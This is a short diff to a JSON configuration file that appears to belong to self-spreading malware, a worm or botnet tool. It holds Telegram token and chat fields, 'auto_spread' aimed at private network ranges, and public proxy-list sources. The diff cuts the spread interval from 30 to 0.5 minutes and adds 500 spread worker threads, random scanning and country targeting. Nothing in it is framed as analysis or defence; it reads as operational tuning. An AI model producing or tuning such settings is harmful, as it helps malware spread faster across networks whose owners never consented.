@@ -8,7 +8,7 @@
   "telegram_token": "",
   "telegram_chat_id": "",
   "auto_spread_enabled": true,
-  "auto_spread_interval_min": 30,
+  "auto_spread_interval_min": 0.5,
   "auto_spread_ranges": [
     "192.168.0.0/16",
     "10.0.0.0/8",
@@ -21,5 +21,8 @@
     "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
     "https://sunny9577.github.io/proxy-scraper/proxies.txt"
   ],
-  "theme": "cyber_light"
+  "theme": "cyber_light",
+  "spread_worker_threads": 500,
+  "scan_mode": "random",
+  "target_countries": []
 }
